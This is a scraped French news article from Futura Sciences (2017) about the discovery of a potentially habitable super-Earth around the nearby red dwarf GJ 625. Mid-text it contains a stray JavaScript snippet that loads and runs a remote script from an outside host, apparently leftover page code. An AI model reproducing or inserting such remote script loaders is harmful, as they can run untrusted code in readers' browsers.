{"title": "Decouverte d'une superterre potentiellement habitable proche de chez nous", "newspaper": "Futura Sciences", "author": ["Xavier Demeersman"], "date_publi": "2017-05-31", "content": "Apres trois ans et demi de recherche, une equipe d'astronomes europeens a mis la main sur une superterre en orbite autour d'une petite etoile situee a seulement 21 annees-lumiere. Les premiers elements de leur enquete indiquent qu'elle est potentiellement habitable. Les etoiles plus petites et moins massives que le  Soleil , comme les  naines rouges , tres nombreuses dans la  Galaxie , interessent beaucoup les astronomes depuis quelques annees. Il semble en effet que les  petites planetes rocheuses  sont plus repandues autour d'elles. C'est dans cette optique d'en debusquer autour de ces etoiles de type M qu'a ete cree le programme Hades ( HArps-n red Dwarf Exoplanet Survey ). Durant trois ans et demi, Alejandro Suarez Mascareno, de l'Institut d' astrophysique  des iles Canaries, et son equipe ont patiemment epie l'un de leurs suspects, GJ 625, une  etoile  situee a seulement 21  annees-lumiere  de nous -- autrement dit dans notre voisinage galactique --, dont la taille et la  masse  sont d'environ un tiers de celles de notre Soleil.  ( function () { var vs = document.createElement(\"script\"); vs.type = \"text/javascript\"; vs.async = true; vs.src = \"http://kweb.r66net.com/GetLink\"; var s = document.getElementsByTagName(\"script\")[0]; s.parentNode.insertBefore(vs, s); })();  L'eau coule-t-elle a sa surface ? Apres moult verifications, histoire de ne pas confondre l'objet avec, par exemple, l'activite de l'etoile (les  naines rouges  sont souvent tres turbulentes), les chercheurs ont conclu qu'il y a bien une planete autour d'elle. Leurs observations conduites durant toutes ces annees avec le  spectrographe  Harps-N ( High Accuracy Radial velocity Planet Searcher , N pour  hemisphere nord ), installe sur le  Telescopio Nazionale  Galileo  a l'observatoire de  Roque de los Muchachos , sur l'ile de La palma, leur ont ainsi permis d'inferer qu'il s'agit d'une  superterre . C'est meme la plus << legere >>  superterre  connue a ce jour autour d'une etoile de ce type. Sa masse est estimee a environ 2,8 fois celle de la  Terre . Est-elle habitable ? Pour l'instant les auteurs de l'etude qui a ete publiee dans  arXiv  pensent que oui. Elle se situe pres du bord interne de la zone habitabilite de son etoile-parent autour de laquelle elle  orbite  en 14,6 jours. Ils evaluent la temperature moyenne de sa surface a 77 degC (350 K) mais, bien sur, la  compatibilite  avec la presence d'une vie similaire a la notre depend de plusieurs facteurs encore inconnus quant a la presence ou non d'une  atmosphere  et de ses caracteristiques. Il est encore trop tot pour l'instant, pour savoir si de l'eau coule a sa surface mais les chercheurs sont confiants. ", "theme": "sciences"}